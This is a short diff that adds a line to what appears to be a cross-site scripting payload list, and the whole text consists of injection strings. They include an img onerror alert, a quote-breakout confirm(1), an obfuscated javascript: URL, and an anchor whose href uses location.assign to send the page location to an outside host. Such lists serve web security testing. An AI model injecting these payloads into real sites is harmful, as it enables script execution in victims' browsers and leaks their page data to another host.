@@ -1,3 +1,4 @@
+\&#34;+confirm(1)+&#34;
 <img src=x onerror=alert('XSS')//
 "><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click
 javas%09script:alert(1)
